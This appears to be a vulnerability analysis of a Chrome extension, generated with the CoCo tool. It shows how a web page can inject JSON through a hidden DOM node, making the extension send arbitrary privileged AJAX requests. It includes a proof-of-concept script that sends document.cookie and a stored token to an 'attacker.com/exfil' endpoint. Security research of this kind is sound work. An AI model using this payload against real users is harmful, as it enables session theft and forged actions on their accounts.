# CoCo Analysis: gkgekoobpemklogaclbobliifdfbmljf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 7 (multiple related jQuery AJAX flows)

---

## Sink: document_body_innerText → jQuery_ajax_settings_url_sink & jQuery_ajax_settings_data_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gkgekoobpemklogaclbobliifdfbmljf/opgen_generated_files/cs_0.js
Line 487    var msg = JSON.parse(_pluginNode.innerText);
    JSON.parse(_pluginNode.innerText)
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gkgekoobpemklogaclbobliifdfbmljf/opgen_generated_files/bg.js
Line 1050    var model = data.data;
    data.data
Line 1063    ajaxModel.url = model.Url;
    model.Url
```

**Code:**

```javascript
// Content script (cs_0.js, lines 469-489) - Entry point
var _pluginNode = document.createElement("div");
_pluginNode.id = "wzn-chrome-extension-installed";
_pluginNode.style.display = 'none';
document.body.appendChild(_pluginNode);

var _connect = chrome.runtime.connect({ name: "wznPlugin_content" });

_connect.onMessage.addListener(function (msg) {
    _pluginNode.innerText = JSON.stringify(msg);
    _pluginNode.dispatchEvent(_eventFromChrome);
});

// Webpage can control _pluginNode.innerText via DOM manipulation
_pluginNode.addEventListener('EventFromPage', function () {
    var msg = JSON.parse(_pluginNode.innerText); // ← attacker-controlled from webpage
    _connect.postMessage(msg); // ← sends to background
});

// Background script (bg.js, lines 974-989)
chrome.runtime.onConnect.addListener(function (connect) {
    connect.onMessage.addListener(function (msg) { // ← receives attacker data
        switch (msg.method) {
            case "GetCookies":
                onGetCookies(msg, connect);
                break;
            case "UploadData":
                uploadData(msg, connect); // ← flows to AJAX
                break;
            default:
                onRequest(msg, connect); // ← flows to AJAX
                break;
        }
    });
});

// Default AJAX handler - uses attacker-controlled data object directly
function onRequest(data, connect) {
    data.cache = false;
    data.async = true;
    data.complete = function (xhr, ts) {
        data.complete = null;
        data.responseText = xhr.responseText;
        data.status = xhr.status;
        data.readyState = xhr.readyState;
        connect.postMessage(data);
    };
    var r = $.ajax(data); // ← VULNERABLE: attacker controls entire ajax config (url, data, method, headers, etc.)
}

// Upload handler - extracts URL and data from attacker-controlled model
function uploadData(data, connect) {
    var model = data.data; // ← attacker-controlled
    var formData = new FormData();
    if (model.Param) {
        model.Param.forEach(function (x) { // ← attacker-controlled params
            if (x.type == 'text') {
                formData.append(x.name, x.value);
            } else if (x.type == 'file') {
                var file = dataURLtoFile(x.value, x.fileName);
                formData.append(x.name, file, file.name);
            }
        });
    }
    var ajaxModel = {};
    ajaxModel.url = model.Url; // ← attacker-controlled URL
    ajaxModel.type = "post";
    ajaxModel.data = formData; // ← attacker-controlled data
    ajaxModel.cache = false;
    ajaxModel.contentType = false;
    ajaxModel.processData = false;

    if (model.Headers && model.Headers.length > 0) { // ← attacker-controlled headers
        ajaxModel.beforeSend = function (xhr) {
            model.Headers.forEach(function (x) {
                xhr.setRequestHeader(x.name, x.value);
            });
        }
    }
    $.ajax(ajaxModel); // ← VULNERABLE: SSRF with attacker-controlled URL, data, headers
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM-based - The content script reads from a DOM element (`_pluginNode.innerText`) that can be controlled by the webpage through JavaScript DOM manipulation. The webpage can set `_pluginNode.innerText` to malicious JSON, dispatch the EventFromPage event, and the content script will forward this attacker-controlled data to the background script.

**Attack:**

```javascript
// Malicious webpage code running on wzntool.com or cnfth.com (matches content_scripts)
// Attack 1: SSRF via default handler - send arbitrary request with extension privileges
var pluginNode = document.getElementById('wzn-chrome-extension-installed');
pluginNode.innerText = JSON.stringify({
    method: "AnyMethod", // will use default handler
    url: "http://internal-admin-panel.corp/delete-all",
    type: "POST",
    data: JSON.stringify({admin: true}),
    headers: {"Authorization": "Bearer stolen-token"}
});
var evt = new Event('EventFromPage', {bubbles: true});
pluginNode.dispatchEvent(evt);

// Attack 2: SSRF via UploadData - exfiltrate data to attacker server
pluginNode.innerText = JSON.stringify({
    method: "UploadData",
    data: {
        Url: "https://attacker.com/exfil",
        Param: [
            {type: 'text', name: 'stolen', value: document.cookie},
            {type: 'text', name: 'session', value: localStorage.getItem('token')}
        ],
        Headers: [
            {name: 'X-Custom', value: 'malicious'}
        ]
    }
});
pluginNode.dispatchEvent(evt);
```

**Impact:** Server-Side Request Forgery (SSRF) with full control over HTTP requests. The extension has extensive host permissions for e-commerce sites (AliExpress, eBay, Amazon, Wish, etc.). An attacker on the whitelisted domains (wzntool.com or cnfth.com) can:
1. Make privileged cross-origin requests to any of the permitted domains with the user's cookies
2. Access internal network resources that would normally be blocked by same-origin policy
3. Exfiltrate sensitive data (cookies, tokens, user information) to attacker-controlled servers
4. Perform actions on behalf of the user on e-commerce platforms (potentially placing orders, modifying listings, etc.)
